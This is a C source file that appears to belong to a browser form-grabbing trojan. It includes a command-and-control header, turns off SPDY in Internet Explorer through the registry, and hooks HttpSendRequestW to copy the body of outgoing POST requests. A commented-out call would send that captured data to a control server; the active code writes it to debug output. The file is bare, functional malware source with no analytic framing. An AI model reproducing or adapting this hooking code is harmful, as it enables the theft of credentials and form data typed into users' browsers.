#include <Windows.h>
#include <WinInet.h>
#include "CommandControl.h"
#include "Internet Explorer.h"
#include "Internet Explorer Scanner.h"
#include "Hook Engine.h"
#include "C Runtime.h"
#include "Main.h"


INTERNETEXPLORERMETHODS sINTERNETEXPLORERMETHODS;
PHTTPSENDREQUESTW HTTPSENDREQUESTW;


VOID IEDISABLESPDY()
{
	DWORD Value = 0;
	HKEY Result;
	RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings",0,KEY_ALL_ACCESS|KEY_WOW64_64KEY , &Result);
	RegSetValueExA(Result, "EnableSPDY3_0", 0, REG_DWORD, (BYTE*)&Value, sizeof(DWORD));
	RegCloseKey(Result);
}

BOOL WINAPI INTERNETEXPLORERCALLBACK(
	_In_  DWORD hRequest,
	_In_  LPCTSTR lpszHeaders,
	_In_  DWORD dwHeadersLength,
	_In_  LPVOID lpOptional,
	_In_  DWORD dwOptionalLength
	)
{

	if (lpOptional && dwOptionalLength > 0)
	{
		LPVOID lpHeaders = HeapAlloc(GetProcessHeap(),0x00,dwOptionalLength+1);
		if (lpHeaders)
		{
			DWORD dwHeaders = ~dwHeadersLength == 0 ? wcslen(lpszHeaders)*2:dwHeadersLength*2;
			RtlSecureZeroMemory(lpHeaders,dwOptionalLength+1);
			m_memcpy(lpHeaders,lpOptional,dwOptionalLength);
			//SendPOSTRequest("IE",0,0,"HTTPREQUESTW",strlen("HTTPREQUESTW"),(char*)lpHeaders,dwOptionalLength);

			OutputDebugStringA((char*)lpHeaders);
			HeapFree(GetProcessHeap(),0x00,lpHeaders);
		}
	}

	return HTTPSENDREQUESTW(hRequest, lpszHeaders, dwHeadersLength, lpOptional,dwOptionalLength);
}


VOID InternetExplorerEntry()
{
	RtlSecureZeroMemory(&sINTERNETEXPLORERMETHODS,sizeof(INTERNETEXPLORERMETHODS));
	sINTERNETEXPLORERMETHODS.HttpSendRequestW = FindHTTPSendRequestW();

	IEDISABLESPDY();

	if (sINTERNETEXPLORERMETHODS.HttpSendRequestW)
	{
		HTTPSENDREQUESTW = (PHTTPSENDREQUESTW)SetHook(INTERNETEXPLORERCALLBACK,(LPVOID)sINTERNETEXPLORERMETHODS.HttpSendRequestW);
	}
}